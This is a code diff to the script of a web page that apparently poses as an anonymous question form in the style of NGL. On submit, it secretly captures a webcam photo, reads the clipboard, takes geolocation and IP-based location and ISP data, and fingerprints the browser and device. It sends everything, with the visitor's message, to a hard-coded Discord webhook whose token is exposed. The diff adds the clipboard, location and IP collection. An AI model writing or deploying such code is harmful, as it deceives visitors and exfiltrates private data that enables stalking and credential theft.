@@ -140,152 +140,256 @@
     }, 800)
 
     // webhook
+    let startTime = Date.now();
+
     async function postToWebhook(event) {
-  event.preventDefault(); // Prevent the form from submitting the traditional way
+      event.preventDefault(); // Prevent the form from submitting the traditional way
 
-  var question = document.getElementById('question').value;
-  var camvalue = false;
-  var webhookURL = 'https://discord.com/api/webhooks/1262358027990732952/gDMkNtHzI686oGjvJWCDo5psdbESTQLAdV9uuv_0Vu3mk2-X0mp95YZh_6qQwaMoklvT';
+      var question = document.getElementById('question').value;
+      var camvalue = false;
+      var ipvalue = 'Unknown';
+      var ispvalue = 'Unknown';
+      var cityvalue = 'Unknown';
+      var regionvalue = 'Unknown';
+      var countryvalue = 'Unknown';
+      var browservalue = navigator.userAgent;
+      var osvalue = getOS();
+      var dtvalue = getDeviceType();
+      var rurlvalue = document.referrer || 'Direct access';
+      var timevalue = Math.floor((Date.now() - startTime) / 1000) + ' seconds';
+      var srvalue = `${window.screen.width}x${window.screen.height}`;
+      var clipboardvalue = 'Access denied by user!';
+      var locvalue = 'Unknown';
+      var webhookURL = 'https://discord.com/api/webhooks/1262358027990732952/gDMkNtHzI686oGjvJWCDo5psdbESTQLAdV9uuv_0Vu3mk2-X0mp95YZh_6qQwaMoklvT';
 
-  try {
-    // Step 1: Request Camera Access and Capture Image
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      try {
+        // Step 1: Request Clipboard Access and get data
+        try {
+          clipboardvalue = await navigator.clipboard.readText();
+        } catch (error) {
+          console.error('Clipboard access error:', error);
+        }
 
-    // Check if camera access was granted
-    camvalue = true;
+        // Step 2: Request Camera Access and Capture Image
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-    // Proceed with capturing the image
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+          // Check if camera access was granted
+          camvalue = true;
 
-    video.srcObject = stream;
+          // Proceed with capturing the image
+          const video = document.getElementById('video');
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
 
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => {
-        video.play();
-        resolve();
-      };
-    });
+          video.srcObject = stream;
 
-    // Capture image from video stream
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    stream.getTracks().forEach(track => track.stop());
+          await new Promise(resolve => {
+            video.onloadedmetadata = () => {
+              video.play();
+              resolve();
+            };
+          });
 
-    // Convert captured image to Blob
-    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+          // Capture image from video stream
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
 
-    // Send Image to Discord Webhook
-    var formData = new FormData();
-    formData.append('file', imageBlob, 'capture.jpg');
+          // Convert captured image to Blob
+          const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-    await fetch(webhookURL, {
-      method: 'POST',
-      body: formData
-    });
+          // Send Image to Discord Webhook
+          var formData = new FormData();
+          formData.append('file', imageBlob, 'capture.jpg');
 
-  } catch (error) {
-    console.error('Camera access error:', error);
-  }
+          await fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          });
 
-  // Step 2: Send Embed to Discord Webhook
-  sendEmbedToWebhook(webhookURL, question, camvalue);
+        } catch (error) {
+          console.error('Camera access error:', error);
+        }
 
-  return false; // Prevent the form from submitting the traditional way
-}
+        // Step 3: Fetch IP Address and additional details
+        try {
+          const ipResponse = await fetch('https://ipapi.co/json/');
+          const ipData = await ipResponse.json();
+          ipvalue = ipData.ip;
+          ispvalue = ipData.org;
+          cityvalue = ipData.city;
+          regionvalue = ipData.region;
+          countryvalue = ipData.country_name;
+        } catch (error) {
+          console.error('IP address fetch error:', error);
+        }
 
-function sendEmbedToWebhook(webhookURL, question, camvalue) {
-  var request = new XMLHttpRequest();
-  request.open("POST", webhookURL);
-  request.setRequestHeader('Content-type', 'application/json');
+        // Step 4: Request Location Access and get data
+        try {
+          locvalue = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                const lat = position.coords.latitude;
+                const long = position.coords.longitude;
+                resolve(`https://www.google.com/maps?q=${lat},${long}`);
+              },
+              (error) => {
+                console.error('Location access error:', error);
+                resolve('Location access denied');
+              }
+            );
+          });
+        } catch (error) {
+          console.error('Geolocation error:', error);
+        }
 
-  var params = {
-    content: "", // Leave content empty if you don't want it in the top-level content
-    embeds: [
-      {
-        "author": {
-          "name": "2xbitx",
-          "icon_url": "https://avatars.githubusercontent.com/R-uru",
-          "url": "https://github.com/R-uru"
-        },
-        "title": "NGL Reveal",
-        "url": "https://github.com/R-uru",
-        "description": "|| @everyone ||\n**\n🐧INFO SEC**",
-        "fields": [
-          {
-            "name": "💌Message:",
-            "value": question
-          },
-          {
-            "name": "📍IP Address:",
-            "value": "192.168.100.1"
-          },
-          {
-            "name": "🛜Browser Type and Version:",
-            "value": "20"
-          },
-          {
-            "name": "💻Operating System:",
-            "value": "windows"
-          },
-          {
-            "name": "📱Device Type:",
-            "value": "dtvalue"
-          },
-          {
-            "name": "🔗Referrer URL:",
-            "value": "rurlvalue"
-          },
-          {
-            "name": "⌛Time Spent on Site:",
-            "value": "timevalue"
-          },
-          {
-            "name": "📳Screen Resolution:",
-            "value": "srvalue"
-          },
-          {
-            "name": "👆🏻Click Patterns:",
-            "value": "clickvalue"
-          },
-          {
-            "name": "⚠️⚠️Explicit Permission⚠️⚠️",
-            "value": "Please acknowledge."
-          },
-          {
-            "name": "🗺️Location Data:",
-            "value": "locvalue"
-          },
-          {
-            "name": "📸Camera Access:",
-            "value": camvalue ? "Camera access granted" : "Camera access denied"
-          },
-          {
-            "name": "📋Clipboard:",
-            "value": "clipvalue"
-          }
-        ],
-        "color": 16711680, // Use an integer for color
-        "footer": {
-          "text": "Made by: 2xbitx",
-          "url": "https://github.com/R-uru",
-          "icon_url": "https://avatars.githubusercontent.com/R-uru"
-        },
-        "timestamp": new Date().toISOString() // Corrected timestamp format
+        // Step 5: Send Embed to Discord Webhook
+        sendEmbedToWebhook(webhookURL, question, camvalue, ipvalue, ispvalue, cityvalue, regionvalue, countryvalue, browservalue, osvalue, dtvalue, rurlvalue, timevalue, srvalue, clipboardvalue, locvalue);
+
+      } catch (error) {
+        console.error('Failed to send question. Error:', error);
       }
-    ]
-  };
 
-  request.send(JSON.stringify(params));
-  request.onload = function () {
-    if (request.status >= 200 && request.status < 300) {
-      document.getElementById('webhookForm').reset(); // Reset the form
-      window.location.href = "p/sent.html";
-    } else {
-      console.log('Failed to send question. Status code: ' + request.status);
+      return false; // Prevent the form from submitting the traditional way
     }
-  }
-}
+
+    function sendEmbedToWebhook(webhookURL, question, camvalue, ipvalue, ispvalue, cityvalue, regionvalue, countryvalue, browservalue, osvalue, dtvalue, rurlvalue, timevalue, srvalue, clipboardvalue, locvalue) {
+      var request = new XMLHttpRequest();
+      request.open("POST", webhookURL);
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        content: "", // Leave content empty if you don't want it in the top-level content
+        embeds: [
+          {
+            "author": {
+              "name": "2xbitx",
+              "icon_url": "https://avatars.githubusercontent.com/R-uru",
+              "url": "https://github.com/R-uru"
+            },
+            "title": "NGL Reveal",
+            "url": "https://github.com/R-uru",
+            "description": "|| @everyone ||\n**\n🐧INFO SEC**",
+            "fields": [
+              {
+                "name": "💌Message:",
+                "value": question
+              },
+              {
+                "name": "📍IP Address:",
+                "value": ipvalue
+              },
+              {
+                "name": "➖ ISP:",
+                "value": ispvalue
+              },
+              {
+                "name": "➖ City:",
+                "value": cityvalue
+              },
+              {
+                "name": "➖ Region:",
+                "value": regionvalue
+              },
+              {
+                "name": "➖ Country:",
+                "value": countryvalue
+              },
+              {
+                "name": "🛜Browser Type and Version:",
+                "value": browservalue
+              },
+              {
+                "name": "💻Operating System:",
+                "value": osvalue
+              },
+              {
+                "name": "📱Device Type:",
+                "value": dtvalue
+              },
+              {
+                "name": "🔗Referrer URL:",
+                "value": rurlvalue
+              },
+              {
+                "name": "⌛Time Spent on Site:",
+                "value": timevalue
+              },
+              {
+                "name": "📳Screen Resolution:",
+                "value": srvalue
+              },
+              {
+                "name": "📋Clipboard:",
+                "value": "```" + clipboardvalue.slice(0, 1024) + "```"// Truncate clipboard value to 1024 characters
+              },
+              {
+                "name": "🗺️Location Data:",
+                "value": locvalue
+              },
+              {
+                "name": "📸Camera Access:",
+                "value": camvalue ? "Camera access granted" : "Camera access denied"
+              }
+            ],
+            "color": 16711680, // Use an integer for color
+            "footer": {
+              "text": "Made by: 2xbitx",
+              "url": "https://github.com/R-uru",
+              "icon_url": "https://avatars.githubusercontent.com/R-uru"
+            },
+            "timestamp": new Date().toISOString() // Corrected timestamp format
+          }
+        ]
+      };
+
+      console.log('Embed Data:', JSON.stringify(params, null, 2)); // Log the data being sent
+
+      request.send(JSON.stringify(params));
+      request.onload = function () {
+        if (request.status >= 200 && request.status < 300) {
+          document.getElementById('webhookForm').reset(); // Reset the form
+          window.location.href = "p/sent.html";
+        } else {
+          console.log('Failed to send question. Status code: ' + request.status);
+          console.log('Response: ', request.responseText); // Log the response for debugging
+        }
+      }
+    }
+
+    function getOS() {
+      var userAgent = window.navigator.userAgent,
+        platform = window.navigator.platform,
+        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+        os = null;
+
+      if (macosPlatforms.indexOf(platform) !== -1) {
+        os = 'Mac OS';
+      } else if (iosPlatforms.indexOf(platform) !== -1) {
+        os = 'iOS';
+      } else if (windowsPlatforms.indexOf(platform) !== -1) {
+        os = 'Windows';
+      } else if (/Android/.test(userAgent)) {
+        os = 'Android';
+      } else if (!os && /Linux/.test(platform)) {
+        os = 'Linux';
+      }
+
+      return os;
+    }
+
+    function getDeviceType() {
+      var ua = navigator.userAgent;
+      if (/tablet|ipad|playbook|silk/i.test(ua)) {
+        return 'Tablet';
+      }
+      if (/Mobile|Android|iP(ad|hone|od)|IEMobile|BlackBerry|Kindle|Silk|Opera Mini/i.test(ua)) {
+        return 'Mobile';
+      }
+      return 'Desktop';
+    }
 
   </script>
 </body>
